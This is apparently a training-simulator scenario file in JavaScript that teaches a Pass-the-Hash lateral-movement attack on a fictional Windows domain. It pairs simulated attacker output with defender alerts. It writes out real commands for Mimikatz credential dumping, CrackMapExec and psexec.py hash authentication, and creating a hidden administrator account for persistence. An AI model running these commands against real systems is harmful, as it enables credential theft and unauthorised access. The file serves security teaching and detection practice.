/**
 * Pass-the-Hash (PtH) Attack Scenario
 * 
 * This scenario simulates the Pass-the-Hash attack, where an attacker uses
 * stolen NTLM hashes to authenticate without knowing the plaintext password.
 */

export const pthScenario = {
  id: 'pass-the-hash',
  title: 'Pass-the-Hash: Lateral Movement Without Passwords',
  description: 'Learn how attackers use stolen NTLM hashes to move laterally through the network.',
  
  network: {
    attacker: {
      ip: '10.0.0.5',
      hostname: 'kali-attacker',
      role: 'Red Team Machine'
    },
    target: {
      ip: '10.0.1.10',
      hostname: 'DC01.contoso.local',
      role: 'Domain Controller'
    },
    domain: 'contoso.local'
  },

  guide: {
    overview: `**Pass-the-Hash (PtH)** is a lateral movement technique that uses stolen NTLM password hashes to authenticate to other systems without knowing the plaintext password.

**Attack Flow:**
1. Extract NTLM hashes from a compromised system (via Mimikatz, etc.)
2. Use the hashes to authenticate to other systems
3. Access resources as the compromised user
4. Perform lateral movement and privilege escalation

**Why This Matters:**
Pass-the-Hash is extremely dangerous because it bypasses password requirements. Attackers can move laterally across the network using stolen hashes, making it a critical post-exploitation technique.`,
    
    steps: [
      {
        number: 1,
        title: 'Extract NTLM Hashes',
        description: 'Dump NTLM password hashes from the compromised system using Mimikatz or similar tools.',
        command: 'mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam"',
        tip: 'NTLM hashes are stored in the SAM database on Windows systems'
      },
      {
        number: 2,
        title: 'Identify Target Systems',
        description: 'Scan the network to identify systems where the compromised user has access.',
        command: 'crackmapexec smb 10.0.1.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 --shares',
        tip: 'The hash format is LM:NTLM, where LM is often disabled (aad3b435b51404eeaad3b435b51404ee)'
      },
      {
        number: 3,
        title: 'Access Target System',
        description: 'Use the NTLM hash to authenticate to a target system without knowing the password.',
        command: 'psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 admin@10.0.1.20',
        tip: 'The hash allows authentication just like a password would'
      },
      {
        number: 4,
        title: 'Establish Persistence',
        description: 'Create a backdoor or persistence mechanism on the target system.',
        command: 'net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add',
        tip: 'Persistence ensures continued access even if the original account is disabled'
      },
      {
        number: 5,
        title: 'Escalate Privileges',
        description: 'Use the compromised system to escalate privileges and move toward Domain Admin.',
        command: null,
        tip: 'Repeat PtH attacks to compromise additional high-privilege accounts'
      }
    ]
  },

  steps: [
    {
      id: 1,
      expectedCommand: 'mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam"',
      attackerOutput: [
        '[*] Starting Mimikatz...',
        '[*] Requesting debug privilege...',
        '[+] Debug privilege obtained',
        '[*] Elevating token...',
        '[+] Token elevated to SYSTEM',
        '[*] Dumping SAM database...',
        '[+] SAM dump successful',
        '[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::',
        '[+] Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        '[+] svc_admin:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::',
        '[+] Total hashes extracted: 3'
      ],
      serverOutput: [
        '[SYSTEM] Process: mimikatz.exe started',
        '[SECURITY] Debug privilege requested',
        '[SECURITY] Token elevation detected',
        '[SECURITY] SAM database access detected',
        '[ALERT] Credential dumping activity detected on local system'
      ],
      delay: 500
    },
    {
      id: 2,
      expectedCommand: 'crackmapexec smb 10.0.1.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 --shares',
      attackerOutput: [
        '[*] Starting CrackMapExec SMB scan...',
        '[*] Scanning subnet: 10.0.1.0/24',
        '[*] Using hash authentication (Pass-the-Hash)',
        '[*] Scanning 10.0.1.10 (DC01)...',
        '[+] 10.0.1.10 - SMB signing: True',
        '[+] 10.0.1.10 - Shares: ADMIN$, C$, NETLOGON, SYSVOL, Users',
        '[*] Scanning 10.0.1.20 (SQL01)...',
        '[+] 10.0.1.20 - SMB signing: False',
        '[+] 10.0.1.20 - Shares: ADMIN$, C$, Backups, Data',
        '[*] Scanning 10.0.1.30 (FILE01)...',
        '[+] 10.0.1.30 - SMB signing: False',
        '[+] 10.0.1.30 - Shares: ADMIN$, C$, Shared, Archive',
        '[+] Scan complete - 3 systems accessible with admin hash'
      ],
      serverOutput: [
        '[SMB] Connection from 10.0.0.5 (NTLM auth)',
        '[SMB] User: admin',
        '[SMB] Authentication successful',
        '[SMB] Share access: ADMIN$',
        '[AUDIT] Multiple SMB connections from 10.0.0.5 with admin account',
        '[ALERT] Potential lateral movement activity detected'
      ],
      delay: 600
    },
    {
      id: 3,
      expectedCommand: 'psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 admin@10.0.1.20',
      attackerOutput: [
        '[*] Connecting to 10.0.1.20 (SQL01)...',
        '[*] Using Pass-the-Hash authentication',
        '[*] Hash: aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99',
        '[+] Authentication successful',
        '[+] Connected to SQL01 as admin',
        '[*] Creating service for remote execution...',
        '[+] Service created: PSEXESVC',
        '[+] Executing command shell...',
        '[+] Command shell established',
        'C:\\Windows\\System32> whoami',
        'CONTOSO\\admin',
        'C:\\Windows\\System32> hostname',
        'SQL01',
        '[+] Remote execution successful'
      ],
      serverOutput: [
        '[SMB] Connection from 10.0.0.5',
        '[SMB] User: admin',
        '[SMB] Authentication: NTLM (hash-based)',
        '[SMB] Access: ADMIN$',
        '[SYSTEM] Service creation detected: PSEXESVC',
        '[SYSTEM] Remote command execution initiated',
        '[ALERT] Lateral movement detected - admin account on SQL01'
      ],
      delay: 500
    },
    {
      id: 4,
      expectedCommand: 'net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add',
      attackerOutput: [
        '[*] Creating backdoor user account...',
        '[+] User created: backdoor',
        '[+] Password set: P@ssw0rd123',
        '[*] Adding backdoor to administrators group...',
        '[+] backdoor added to administrators',
        '[+] Persistence established on SQL01',
        '[*] Backdoor account details:',
        '[+]   Username: backdoor',
        '[+]   Password: P@ssw0rd123',
        '[+]   Group: Administrators',
        '[+]   Persistence: Confirmed'
      ],
      serverOutput: [
        '[SYSTEM] User account created: backdoor',
        '[SYSTEM] Group membership changed: backdoor -> Administrators',
        '[AUDIT] New administrator account created',
        '[ALERT] Persistence mechanism detected',
        '[ALERT] Recommend investigation of new user accounts'
      ],
      delay: 500
    },
    {
      id: 5,
      expectedCommand: null,
      attackerOutput: [
        '',
        '[+] ============================================',
        '[+] Pass-the-Hash Attack Summary',
        '[+] ============================================',
        '[+] Hashes Extracted: 3',
        '[+] Systems Scanned: 3',
        '[+] Systems Compromised: 1 (SQL01)',
        '[+] Backdoor Accounts Created: 1',
        '[+] Persistence: Established',
        '[+] ============================================',
        '[*] Next Steps:',
        '[*] 1. Use backdoor account for persistent access',
        '[*] 2. Repeat PtH attacks on other systems',
        '[*] 3. Target Domain Controller for Domain Admin',
        '[*] 4. Establish domain-wide persistence',
        '',
        '[+] Lateral movement successful! 🎯'
      ],
      serverOutput: [
        '',
        '[ALERT] SECURITY INCIDENT DETECTED',
        '[ALERT] Lateral movement attack in progress',
        '[ALERT] Multiple systems compromised:',
        '[ALERT]   - SQL01: admin account (PtH)',
        '[ALERT]   - SQL01: backdoor account (persistence)',
        '[ALERT] Recommend immediate incident response:',
        '[ALERT]   1. Reset all user passwords',
        '[ALERT]   2. Disable compromised accounts',
        '[ALERT]   3. Review SMB logs for lateral movement',
        '[ALERT]   4. Scan for additional backdoors'
      ],
      delay: 400
    }
  ]
};

export default pthScenario;
